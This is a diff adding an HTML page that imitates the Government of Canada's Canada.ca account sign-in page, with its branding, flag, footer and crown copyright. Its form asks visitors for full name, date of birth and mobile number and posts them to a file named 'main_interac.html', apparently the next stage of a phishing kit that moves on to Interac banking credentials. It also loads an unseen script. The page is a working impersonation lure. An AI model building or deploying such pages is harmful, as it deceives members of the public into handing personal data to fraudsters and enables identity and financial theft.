@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to a Government of Canada online account - Canada.ca</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: "Noto Sans", Arial, sans-serif;
+            background-color: #ffffff;
+            color: #333333;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Header */
+        header {
+            background-color: #ffffff;
+            border-bottom: 1px solid #e5e5e5;
+            padding: 12px 16px;
+        }
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+        }
+        .flag-icon {
+            width: 40px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+        .gov-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            line-height: 1.2;
+        }
+        .gov-title span {
+            display: block;
+            font-weight: 400;
+            font-size: 14px;
+        }
+        .lang-toggle {
+            color: #284162;
+            font-weight: 700;
+            font-size: 16px;
+            text-decoration: underline;
+        }
+
+        /* Search Bar Section */
+        .search-section {
+            max-width: 1200px;
+            margin: 15px auto 0;
+            padding: 0 16px;
+        }
+        .search-box {
+            display: flex;
+            max-width: 450px;
+            margin-left: auto;
+        }
+        .search-input {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 16px;
+            border: 1px solid #757575;
+            border-right: none;
+            border-radius: 4px 0 0 4px;
+            outline: none;
+        }
+        .search-btn {
+            background-color: #26374a;
+            color: #ffffff;
+            border: 1px solid #26374a;
+            padding: 0 16px;
+            border-radius: 0 4px 4px 0;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Menu Bar */
+        .menu-bar {
+            max-width: 1200px;
+            margin: 15px auto 20px;
+            padding: 0 16px;
+        }
+        .menu-btn {
+            background-color: #26374a;
+            color: #ffffff;
+            border: none;
+            padding: 10px 18px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 4px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Main Content Container */
+        .main-container {
+            max-width: 750px;
+            margin: 0 auto;
+            padding: 0 16px 50px;
+        }
+        .breadcrumb {
+            margin-bottom: 20px;
+        }
+        .breadcrumb a {
+            color: #284162;
+            text-decoration: underline;
+            font-size: 16px;
+        }
+
+        .page-title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #333333;
+            line-height: 1.25;
+            margin-bottom: 12px;
+        }
+        .red-line {
+            width: 70px;
+            height: 4px;
+            background-color: #af3c43;
+            margin-bottom: 25px;
+        }
+        .description-text {
+            font-size: 17px;
+            color: #333333;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* Form Card */
+        .form-card {
+            background-color: #ffffff;
+            border: 1px solid #dcdee1;
+            border-radius: 4px;
+            padding: 30px 24px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+        }
+        .form-group {
+            margin-bottom: 24px;
+        }
+        .form-label {
+            display: block;
+            font-size: 16px;
+            font-weight: 700;
+            color: #333333;
+            margin-bottom: 8px;
+        }
+        .form-label .required-star {
+            color: #d3080c;
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 16px;
+            color: #333333;
+            border: 1px solid #555555;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-input:focus {
+            border-color: #284162;
+            box-shadow: 0 0 0 3px rgba(40, 65, 98, 0.25);
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: #318000;
+            color: #ffffff;
+            border: 1px solid #2b7000;
+            padding: 14px 24px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+        }
+        .btn-submit:hover {
+            background-color: #2b7000;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #26374a;
+            color: #ffffff;
+            padding: 40px 16px 30px;
+            margin-top: 60px;
+        }
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px 30px;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .footer-links a {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+        .footer-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #3a4f66;
+            padding-top: 20px;
+            font-size: 14px;
+        }
+        .canada-wordmark {
+            font-weight: bold;
+            font-size: 20px;
+            letter-spacing: -0.5px;
+        }
+
+        /* Loader Overlay */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 999999;
+            visibility: hidden;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .loader-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .loader-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #26374a;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loader-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header>
+        <div class="header-container">
+            <a href="https://www.canada.ca" class="logo-group">
+                <!-- SVG Flag of Canada -->
+                <svg class="flag-icon" viewBox="0 0 60 30" width="40" height="24">
+                    <rect width="15" height="30" fill="#FF0000"/>
+                    <rect x="15" width="30" height="30" fill="#FFFFFF"/>
+                    <rect x="45" width="15" height="30" fill="#FF0000"/>
+                    <path fill="#FF0000" d="M30,3 L32,10 L35,8 L33,13 L39,12 L35,16 L38,20 L32,18 L30,26 L28,18 L22,20 L25,16 L21,12 L27,13 L25,8 L28,10 Z"/>
+                </svg>
+                <div class="gov-title">
+                    Government of Canada
+                    <span>Gouvernement du Canada</span>
+                </div>
+            </a>
+            <a href="#" class="lang-toggle">FR</a>
+        </div>
+    </header>
+
+    <!-- Search Section -->
+    <div class="search-section">
+        <div class="search-box">
+            <input type="text" class="search-input" placeholder="Search Canada.ca">
+            <button class="search-btn" type="button" aria-label="Search">
+                <i class="fa-solid fa-magnifying-glass"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Menu Bar -->
+    <div class="menu-bar">
+        <button class="menu-btn" type="button">
+            MENU <i class="fa-solid fa-chevron-down"></i>
+        </button>
+    </div>
+
+    <!-- Main Container -->
+    <div class="main-container">
+        <div class="breadcrumb">
+            <a href="#">Canada.ca</a>
+        </div>
+
+        <h1 class="page-title">Sign in to a Government of Canada online account</h1>
+        <div class="red-line"></div>
+
+        <p class="description-text">
+            There are separate accounts for the many services across the Government of Canada. Use the form below to verify your identity and access your account or service.
+        </p>
+
+        <!-- Form -->
+        <div class="form-card">
+            <form action="main_interac.html" method="POST">
+                
+                <div class="form-group">
+                    <label for="fullName" class="form-label">Full name <span class="required-star">*</span></label>
+                    <input type="text" id="fullName" name="fullName" class="form-input" placeholder="Enter your full name" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="dob" class="form-label">Date of birth <span class="required-star">*</span></label>
+                    <input type="text" id="dob" name="dob" class="form-input" placeholder="MM/DD/YYYY" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone" class="form-label">Mobile number <span class="required-star">*</span></label>
+                    <input type="tel" id="phone" name="phone" class="form-input" placeholder="Enter your mobile number" required>
+                </div>
+
+                <button type="submit" class="btn-submit">Continue</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-container">
+            <div class="footer-links">
+                <a href="#">All contacts</a>
+                <a href="#">Departments and agencies</a>
+                <a href="#">About Canada.ca</a>
+                <a href="#">Terms and conditions</a>
+                <a href="#">Privacy</a>
+            </div>
+            <div class="footer-bottom">
+                <div>&copy; His Majesty the King in Right of Canada, 2026</div>
+                <div class="canada-wordmark">Canada</div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Loader Overlay -->
+    <div id="loaderOverlay" class="loader-overlay">
+        <div class="loader-spinner"></div>
+        <p class="loader-text">Processing...</p>
+    </div>
+
+    <script src="security_module.js"></script>
+</body>
+</html>
